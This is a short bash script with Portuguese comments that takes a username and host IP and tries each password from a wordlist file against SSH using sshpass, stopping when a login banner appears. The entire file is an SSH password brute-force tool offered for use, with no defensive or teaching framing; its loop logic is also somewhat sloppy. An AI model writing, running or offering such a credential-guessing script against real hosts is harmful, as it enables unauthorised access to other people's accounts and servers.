#!/usr/bin/env bash

#EM PRODUÇÃO!! (Funciona, mas precisa de formatação!)


for senhas in $(cat sshsenhas.txt);do
  if [ $(sshpass -p $senhas ssh $1@$2 | grep Welcome) ];then
    exit 0
else
    echo "Nenhuma credencial com sucesso"
fi
done






#primeiro user, dps ip host
